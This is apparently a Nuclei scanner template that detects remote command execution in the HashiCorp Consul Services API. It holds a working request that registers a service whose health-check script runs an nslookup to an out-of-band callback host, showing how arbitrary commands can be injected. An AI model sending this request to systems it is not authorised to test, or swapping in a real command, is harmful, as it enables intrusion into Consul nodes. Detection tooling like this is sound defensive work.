http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - "PUT /v1/agent/service/register HTTP/1.1\nHost: {{Hostname}}\n\n{\n  \"ID\": \"\
    {{randstr}}\",\n  \"Name\": \"{{randstr}}\",\n  \"Address\": \"127.0.0.1\",\n\
    \  \"Port\": 80,\n  \"check\": {\n    \"script\": \"nslookup {{interactsh-url}}\"\
    ,\n    \"interval\": \"10s\",\n    \"Timeout\": \"86400s\"\n  }\n}\n"
id: hashicorp-consul-rce
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: Hashicorp Consul Services API is vulnerable to an attack that can be
    leveraged to perform remote command execution on Consul nodes.
  metadata:
    max-request: 1
  name: Hashicorp Consul Services API - Remote Code Execution
  reference:
  - https://www.exploit-db.com/exploits/46074
  severity: critical
  tags: hashicorp,rce,oast,intrusive,edb,vuln
